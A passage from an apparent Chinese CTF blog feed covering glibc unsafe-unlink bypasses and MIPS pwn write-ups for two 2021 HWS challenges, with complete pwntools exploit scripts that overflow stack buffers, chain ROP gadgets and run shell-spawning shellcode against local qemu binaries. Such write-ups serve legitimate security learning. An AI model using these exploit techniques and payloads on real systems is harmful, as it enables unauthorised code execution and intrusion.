(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">              malloc_printerr (check_action,                                      </span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><h4 id="以前的unlink"><a href="#以前的unlink" class="headerlink" title="以前的unlink"></a>以前的unlink</h4><p>以32位程序为例</p><p>假设申请了三个堆块，并存在堆溢出，我们先将<code>chunk 2</code>给<code>free</code>掉，然后利用堆溢出覆盖<code>fd</code>和<code>bk</code></p><p>我们回忆一下，<code>unlink</code>会执行啥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FD = P -&gt; fd = free@got - 12</span><br><span class="line"></span><br><span class="line">BK = P -&gt; bk = system@got</span><br><span class="line"></span><br><span class="line">FD -&gt; bk = BK =&gt; (free@got - 12) + 12 = system@got</span><br><span class="line"></span><br><span class="line">BK -&gt; fd = FD =&gt; system@got + 8 = free@got</span><br></pre></td></tr></table></figure><p>执行完之后，<code>free@got</code>就变成了<code>system@got</code>，还要一点需要注意的是<code>system@got + 8 = free@got</code>，如果没有改回来有可能会发送一下奇奇怪怪的事情</p><img src="/2021/10/05/unsafe-unlink/2.png" class=""><h4 id="目前的unlink"><a href="#目前的unlink" class="headerlink" title="目前的unlink"></a>目前的unlink</h4><p>讲完没有检查的情况，接下来就是有检查的情况了，它只要检查的是<code>FD-&gt;bk != P || BK-&gt;fd != P</code></p><p>只要绕过这个检查就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk = BK =&gt; (free@got - 12) + 12</span><br><span class="line"></span><br><span class="line">BK -&gt; fd = FD =&gt; system@got + 8</span><br></pre></td></tr></table></figure><p>我们看看刚刚的转换，明显不相等，是吧！</p><p>那按照这个检查，我们就可以进行伪造，这样一来就相等了对吧！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FD -&gt; bk =&gt; (p - 12) + 12 = p</span><br><span class="line"></span><br><span class="line">BK -&gt; fd =&gt; (p - 8) + 8 = p</span><br></pre></td></tr></table></figure><p>那么最终实现的效果就是，跟刚刚的直接修改GOT表相比，只是修改了<code>chunk</code>的指针，反差有点大，但是它还是有它的攻击效果的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(p - 8) + 8 = p - 12</span><br></pre></td></tr></table></figure><p>例题为<strong>2016 ZCTF note2</strong>，参考《<code>buu</code>刷题记之PWN系列》向前和向后合并的源码解析都在那，这里就不赘述了！</p><h4 id="完整源码分析"><a href="#完整源码分析" class="headerlink" title="完整源码分析"></a>完整源码分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line"><span class="comment">//检查chunk的size如果和nextchunk的prev_size不相等就报错</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);                              </span><br><span class="line">    FD = P-&gt;fd;                                                                     </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);                           </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">        FD-&gt;bk = BK;                                                              </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="comment">//下面是largechunk的检查   </span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                             </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;                      </span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              </span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">                malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                                      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                      </span><br><span class="line">                    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                      </span><br><span class="line">                <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                              </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                              </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                              </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                              </span><br><span class="line">                &#125;                                                              </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;                                                              </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                      </span><br><span class="line">            &#125;                                                                                 &#125;                                                                      </span><br><span class="line">       &#125;                                                                              &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MIPS PWN入门</title>
      <link href="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/"/>
      <url>/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="2021HWS冬令营入营赛赛题–Mplogin"><a href="#2021HWS冬令营入营赛赛题–Mplogin" class="headerlink" title="2021HWS冬令营入营赛赛题–Mplogin"></a>2021HWS冬令营入营赛赛题–Mplogin</h4><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/1-1633421980904.png" class=""><p>32位小端序，并且全红，<code>xuanxuan</code>老师说MIPS不支持NX，去查阅资料，没找到相关的文章，不过在复现RV110W的时候，它确实没有NX…</p><blockquote><p>当然MIPS硬件本身也不支持NX机制</p></blockquote><p>程序就两主要的函数，逻辑也很简单，经典<code>read</code>无截断泄露地址，这个地址是什么地址等下动态的时候在看</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/2-1633421980904.png" class="">第二个函数就存在溢出，人家v2就20字节读了36字节，溢出到v3了都，下一个`read`的时候，就能无限制读，直接覆盖返回地址，劫持控制流，后面还有检查，注意一下就行...<img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/3-1633421980905.png" class=""><p>开始调试…和X86不同，异架构的PWN就需要用到远程调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 1234 -L ./ ./Mplogin</span><br></pre></td></tr></table></figure><p>-g ：暴露调试端口</p><p>-L ：在程序寻找动态链接库的时候优先在此目录下寻找</p><p>之后，我们就可以再启动一个窗口用<code>gdb-mutilarch</code>连接上我们的<code>qemu</code>暴露的调试接口，连接之后就可以进行调试啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line"><span class="built_in">set</span> arch mips</span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>再<code>0x4008D4</code>处下断点，看看它泄露的地址到底是啥，它因为没有开地址随机化，所以一直都是这个地址，很容易就认出来，可以看到泄露的是栈顶指针</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/6.jpg" class=""><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/4-1633421980905.png" class=""><blockquote><p>由于MIPS的特殊性，在函数体中<code>$fp</code>和 <code>$sp</code>是相同的，即都指向栈顶，故这里泄露出的就是<code>main</code>函数进入<code>sub_400840</code>是的栈顶地址</p></blockquote><p>下面测试在第二个函数溢出的偏移，直接发生<code>cyclic(200)</code>的字符，测试出偏移是30（不包括前面的0123456789</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.send(<span class="string">&#x27;0123456789&#x27;</span>+cyclic(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/5-1633421980905.png" class=""><p>直接<code>jmp sp</code>加<code>shellcode</code>拿<code>sehll</code>一气呵成…</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line">io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Mplogin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Username : &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;admin&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">19</span>)</span><br><span class="line">addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]addr =&gt; &quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Pre_Password : &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;access&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">14</span>+p32(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;0123456789&#x27;</span>.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+p32(addr)+asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>小问题&amp;&amp;以后要注意的问题：</p><p>调试的时候一堆SW是什么鬼？？？</p><p>以后在发送数据的时候千万要注意，换行符对<code>payload</code>的影响…</p><h4 id="2021HWS冬令营入营赛赛题–pwn"><a href="#2021HWS冬令营入营赛赛题–pwn" class="headerlink" title="2021HWS冬令营入营赛赛题–pwn"></a>2021HWS冬令营入营赛赛题–pwn</h4><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/8.png" class=""><p>开了<code>canary</code>，但在实际测试中<code>canary</code>并没有起效，怀疑是<code>qemu</code>本身不支持<code>canary</code>（不太清楚，qemu本身不支持NX是真的）</p><p>程序就一个<code>pwn</code>函数，应该就是关键函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, <span class="built_in">stderr</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = atoi(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>((<span class="keyword">int</span>)<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="string">&#x27;aaa\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很快可以发现溢出点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, v6, <span class="number">768</span>);</span><br><span class="line">v17 = &amp;v5[-v16];</span><br><span class="line"><span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br></pre></td></tr></table></figure><p>它先是堆溢出然后再把堆上的内容<code>memcpy</code>到栈上</p><p>那接下来就该调试偏移了，<code>cyclic 200</code>发过去，发现覆盖到FP但到不了PC寄存器，只能自己算算偏移</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/9.png" class=""><p>打开栈布局看看</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/10.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod = <span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>+p32(<span class="number">0xdeadbeef</span>)</span><br></pre></td></tr></table></figure><p>可以看到成功的覆盖了返回地址</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/11.png" class=""><p>由于此程序是静态链接的文件，所以暂时不考虑<code>ret2libc</code>，还是<code>ROP+shellcode</code>的组合，通过<code>mipsrop</code>找到可用的<code>gadget</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  0x0042BCD0  |  addiu $a2,$sp,0x88+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  0x0042FA00  |  addiu $v1,$sp,0x138+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  0x004491F8  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  0x0044931C  |  addiu $v0,$sp,0x30+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x00449444  |  addiu $a2,$sp,0x44+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  0x0044AD58  |  addiu $a1,$sp,0x60+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  0x0044AEFC  |  addiu $a1,$sp,0x64+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  0x0044B154  |  addiu $a1,$sp,0x6C+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  0x0044B1EC  |  addiu $v0,$sp,0x6C+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  0x0044B3EC  |  addiu $v0,$sp,0x170+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  0x00454E94  |  addiu $s7,$sp,0xB8+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  0x00465BEC  |  addiu $a1,$sp,0xC4+var_98                           |  jalr  $s0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 13 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;move $t9,$a2&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x00421684  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>找到这两个可以用的<code>gadget</code>，第一条是将<code>0x70+var_C</code>加到<code>sp</code>上，<code>var_C</code>只有在程序运行的时候才知道，所以只能动调时候看偏移，加完之后呢，就把它放到<code>$a2</code>当中，然后跳转到<code>s0</code>去执行，第二条呢，就是把<code>$a2</code>放到<code>$t9</code>，再跳转到<code>$a2</code>，我们的目的就是在<code>0x70+var_C</code>上布置我们的<code>shellcode</code>，然后再跳到这上面去执行，但是仔细分析一下会发现，<code>$a2</code>是指向了我们的<code>shellcode</code>，但是却少了<code>$s0</code>到<code>$a2</code>的一个桥梁，回顾之前覆盖<code>$ra</code>寄存器的时候，好像把上面的一些寄存器也给覆盖了…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x004273C4  |  addiu $a2,$sp,0x70+var_C                            |  jalr  $s00x00421684  |  move $t9,$a2                                        |  jr    $a2</span><br></pre></td></tr></table></figure><p>没错，因为这是寄存器的值再函数开始的时候就入栈了</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/12-1633421980905.png" class=""><p>既然有入栈那必然有出栈</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/13-1633421980905.png" class=""><p>所以我们就能搭建起<code>$s0</code>到<code>$a2</code>的桥梁，既是覆盖的时候把<code>$s0</code>覆盖到跳转<code>$a2</code>的<code>gadget</code>即可，<strong>计算方法：0x90-$ra的偏移+$s0的偏移</strong>，并且再跳转<code>$ra</code>寄存器之前，它还清理了栈帧，所以<code>shellcode</code>放在<code>$ra</code>寄存器后的偏移即可，这也解释了之前的一堆<code>sw</code>是什么，这也是MIPS的特性，它并没有<code>push</code>和<code>pop</code>指令，而是通过<code>sw</code>和<code>lw</code>来实现入栈和出栈</p><p>在调试的的时候看到addiu $a2,$sp,0x70+var_C最终变成了addiu $a2,$sp,0x64，所以把shellcode的偏移改成0x64就可以不用靠”nop”滑板指令进行填充</p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/14-1633421980905.png" class=""><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"><span class="comment"># io = process([&quot;qemu-mips&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;./pwn&quot;])</span></span><br><span class="line"><span class="comment"># elf = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span><span class="comment">#addiu $a2,$sp,0x70+var_C|  jalr  $s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment">#move $t9,$a2|  jr    $a2</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>)</span><br><span class="line">paylaod = <span class="string">&#x27;1:&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(s0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(ra)</span><br><span class="line">paylaod += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+asm(<span class="string">&#x27;nop;nop;nop;nop&#x27;</span>)+shellcode</span><br><span class="line">io.sendline(paylaod)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总结：<br>原来…<code>ghidra</code>里面的<code>var_C</code>这类参数是已经算好了，我就奇怪，为啥<code>xuanxuan</code>老师的各种参数都没有，我就有，现在就方便多了！</p><p><a href="https://github.com/NationalSecurityAgency/ghidra/releases">下载地址</a></p><img src="/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/15-1633421980905.jpg" class=""><p>补充资料：</p><p><a href="https://www.cnblogs.com/L0g4n-blog/p/13968404.html">MIPS汇编学习</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RV110W路由器漏洞复现/2020年强网杯赛题</title>
      <link href="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/"/>
      <url>/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/</url>
      
